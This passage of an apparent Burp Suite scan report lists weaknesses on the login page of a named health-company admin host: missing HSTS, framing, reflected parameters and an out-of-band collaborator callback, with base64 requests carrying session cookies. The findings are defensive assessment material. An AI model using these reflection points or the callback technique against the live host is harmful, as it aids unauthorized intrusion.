      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG9iMzNocDI0eGw0enBqeXd1M3F3ZnZmeTZwY2owaDE1dTRpdTVrdDkub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:59:58.959 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG9iMzNocDI0eGw0enBqeXd1M3F3ZnZmeTZwY2owaDE1dTRpdTVrdDkub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncXRnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>1959455209788591104</serialNumber>
    <type>16777984</type>
    <name><![CDATA[Strict transport security not enforced]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/login]]></path>
    <location><![CDATA[/login]]></location>
    <severity>Low</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p> The application fails to prevent users from connecting  to it over unencrypted connections.  An attacker able to modify a legitimate user's network traffic could bypass the application's use of SSL/TLS encryption, and use the application as a platform for attacks against its users. This attack is performed by rewriting HTTPS links as HTTP, so that if a targeted user follows a link to the site from an HTTP page, their browser never attempts to use an encrypted connection. The sslstrip tool  automates this process. </p>
<p>
To exploit this vulnerability, an attacker must be suitably positioned to intercept and modify the victim's network traffic.This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The application should instruct web browsers to only access the application using HTTPS. To do this, enable HTTP Strict Transport Security (HSTS) by adding a response header with the name 'Strict-Transport-Security' and the value 'max-age=expireTime', where expireTime is the time in seconds that browsers should remember that the site should only be accessed using HTTPS. Consider adding the 'includeSubDomains' flag if appropriate.</p>
<p>Note that because HSTS is a &quot;trust on first use&quot; (TOFU) protocol, a user who has never accessed the application will never have seen the HSTS header, and will therefore still be vulnerable to SSL stripping attacks. To mitigate this risk, you can optionally add the 'preload' flag to the HSTS header, and submit the domain for review by browser vendors.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security">HTTP Strict Transport Security</a></li><li><a href="https://github.com/moxie0/sslstrip">sslstrip</a></li><li><a href="https://hstspreload.appspot.com/">HSTS Preload Form</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/523.html">CWE-523: Unprotected Transport of Credentials</a></li><li><a href="https://capec.mitre.org/data/definitions/94.html">CAPEC-94: Man in the Middle Attack</a></li><li><a href="https://capec.mitre.org/data/definitions/157.html">CAPEC-157: Sniffing Attacks</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9sb2dpbiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpDb29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBBV1NBTEJDT1JTPVlYcjUvS1prcDFMRVVFS3BWUWEzaDRhTVgzVzd2bXU5RFhkYU9LZS9aL1JlZm14KzRld2M2QWZrc1NxL3dkeWZVdXU3QTZmRGl2WWJhbjQyWkh5MlFZYTU3d2tsbFRKNWN2NmpTUzF3WDY0c3dHNGFRU3liOGJJcXlHWkI7IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0cw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINClByaW9yaXR5OiB1PTAsIGkNCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3279552437874213888</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/login]]></path>
    <location><![CDATA[/login]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/clickjacking">Web Security Academy: Clickjacking</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li><li><a href="https://cwe.mitre.org/data/definitions/1021.html">CWE-1021: Improper Restriction of Rendered UI Layers or Frames</a></li><li><a href="https://capec.mitre.org/data/definitions/103.html">CAPEC-103: Clickjacking</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9sb2dpbiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpDb29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBBV1NBTEJDT1JTPVlYcjUvS1prcDFMRVVFS3BWUWEzaDRhTVgzVzd2bXU5RFhkYU9LZS9aL1JlZm14KzRld2M2QWZrc1NxL3dkeWZVdXU3QTZmRGl2WWJhbjQyWkh5MlFZYTU3d2tsbFRKNWN2NmpTUzF3WDY0c3dHNGFRU3liOGJJcXlHWkI7IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0cw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINClByaW9yaXR5OiB1PTAsIGkNCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1453402757764260864</serialNumber>
    <type>5244160</type>
    <name><![CDATA[Cross-domain script include]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/login]]></path>
    <location><![CDATA[/login]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>When an application includes a script from an external domain, this script is executed by the browser within the security context of the invoking application. The script can therefore do anything that the application's own scripts can do, such as accessing application data and performing actions within the context of the current user.</p>
<p>If you include a script from an external domain, then you are trusting that domain with the data and functionality of your application, and you are trusting the domain's own security to prevent an attacker from modifying the script to perform malicious actions within your application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Scripts should ideally not be included from untrusted domains. Applications that rely on static third-party scripts should consider using Subresource Integrity to make browsers verify them, or copying the contents of these scripts onto their own domain and including them from there. If that is not possible (e.g. for licensing reasons) then consider reimplementing the script's functionality within application code.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Inclusion of Functionality from Untrusted Control Sphere</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The response dynamically includes the following scripts from other domains:<ul><li>https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js</li><li>https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js]]></issueDetailItem>
      <issueDetailItem><![CDATA[https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9sb2dpbiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpDb29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBBV1NBTEJDT1JTPVlYcjUvS1prcDFMRVVFS3BWUWEzaDRhTVgzVzd2bXU5RFhkYU9LZS9aL1JlZm14KzRld2M2QWZrc1NxL3dkeWZVdXU3QTZmRGl2WWJhbjQyWkh5MlFZYTU3d2tsbFRKNWN2NmpTUzF3WDY0c3dHNGFRU3liOGJJcXlHWkI7IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0cw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINClByaW9yaXR5OiB1PTAsIGkNCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4153822282467033088</serialNumber>
    <type>6291968</type>
    <name><![CDATA[Email addresses disclosed]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/login]]></path>
    <location><![CDATA[/login]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The presence of email addresses within application responses does not necessarily constitute a security vulnerability. Email addresses may appear intentionally within contact information, and many applications (such as web mail) include arbitrary third-party email addresses within their core content.</p>
<p>However, email addresses of developers and other individuals (whether appearing on-screen or hidden within page source) may disclose information that is useful to an attacker; for example, they may represent usernames that can be used at the application's login, and they may be used in social engineering attacks against the organization's personnel. Unnecessary or excessive disclosure of email addresses may also lead to an increase in the volume of spam email received.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Consider removing any email addresses that are unnecessary, or replacing personal addresses with anonymous mailbox addresses (such as helpdesk@example.com).</p>
<p>To reduce the quantity of spam sent to anonymous mailbox addresses, consider hiding the email address and instead providing a form that generates the email server-side, protected by a CAPTCHA if necessary. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure">Web Security Academy: Information disclosure</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following email address was disclosed in the response:<ul><li>PUrTldVn@burpcollaborator.net</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[PUrTldVn@burpcollaborator.net]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvbG9naW4gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPW1wZzJnazFnMGV0cW0xNmM3ODdpNGM5Y2RwOyBBV1NBTEI9VU95cUs1ZDAwRU5xMHVyb2oyTTdLcEIzQnpBOG1BdVhWYXdtMlhPUnhoOC9YQ2lWRW5aNStDakFCNGh4S3MyNzRaR2JZRzJUaU1oNDE1YnptOWJONVFyK1hqQ1RuRUh6blRva05PVUM1dVlaTmkyUEZOM2VjT0tvUURMazsgQVdTQUxCQ09SUz1VT3lxSzVkMDBFTnEwdXJvajJNN0twQjNCekE4bUF1WFZhd20yWE9SeGg4L1hDaVZFblo1K0NqQUI0aHhLczI3NFpHYllHMlRpTWg0MTViem05Yk41UXIrWGpDVG5FSHpuVG9rTk9VQzV1WVpOaTJQRk4zZWNPS29RRExrOyBzY3JlZW5XaWR0aD04MDANCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzgNCg0KcmVkaXJlY3RVUkw9JmVtYWlsPVBVclRsZFZuJTQwYnVycGNvbGxhYm9yYXRvci5uZXQmcGFzc3dvcmQ9UFVyVGxkJmxvZ2luPUxvZ2lu]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4676864184493140992</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/login]]></path>
    <location><![CDATA[/login [redirectURL parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the <b>redirectURL</b> request parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvbG9naW4gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWJsdjA2OTFuZWZqNm5tZWFmYjdlanZyb2M4OyBBV1NBTEI9MDdHcTZMWXYvZmEwbEhadlhPQzN5Q21FbWtndGNIc241cFZLZXJyU1hmV3EvTjJPdkhOcmozeGRpNzIyRUh4cjV0eUpEUTNJNFJHcHZpMTBOcUQyVlNCdjBSRVY1SXdtL2RjeDdnQUVKQ0pOYXJJMUg1YittSUJZTFdoazsgQVdTQUxCQ09SUz0wN0dxNkxZdi9mYTBsSFp2WE9DM3lDbUVta2d0Y0hzbjVwVktlcnJTWGZXcS9OMk92SE5yajN4ZGk3MjJFSHhyNXR5SkRRM0k0UkdwdmkxME5xRDJWU0J2MFJFVjVJd20vZGN4N2dBRUpDSk5hckkxSDViK21JQllMV2hrOyBzY3JlZW5XaWR0aD04MDANCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzgNCg0KcmVkaXJlY3RVUkw9NWNtOTZ2eHlsdSZlbWFpbD1QVXJUbGRWbiU0MGJ1cnBjb2xsYWJvcmF0b3IubmV0JnBhc3N3b3JkPVBVclRsZCZsb2dpbj1Mb2dpbg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5621056228301503488</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/login]]></path>
    <location><![CDATA[/login [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80dW14OTNzZmhyIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IEFXU0FMQj1lNnRGTHBkY2htbTZnUW8rekxEUE9GTnZ1ZE9QVlpQWjNCR2ppc1NSY0E5aEhZbzVhRGxUS1FEKy9WWGZ0UUNmSWFkcVo2QzJCSkdpU0dteUZTQVM5S3NOQzQva1RiSkxuMXNiYy9VQ3NubldldWk2c0FaWG00WXl1YzFvOyBBV1NBTEJDT1JTPWU2dEZMcGRjaG1tNmdRbyt6TERQT0ZOdnVkT1BWWlBaM0JHamlzU1JjQTloSFlvNWFEbFRLUUQrL1ZYZnRRQ2ZJYWRxWjZDMkJKR2lTR215RlNBUzlLc05DNC9rVGJKTG4xc2JjL1VDc25uV2V1aTZzQVpYbTRZeXVjMW87IFBIUFNFU1NJRD1jcTJwbzc4aHJ1c3Y0bzQxbXFjN2p1dHYwdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9yb2JvdHMudHh0DQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8338754621997302784</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/login]]></path>
    <location><![CDATA[/login [email parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
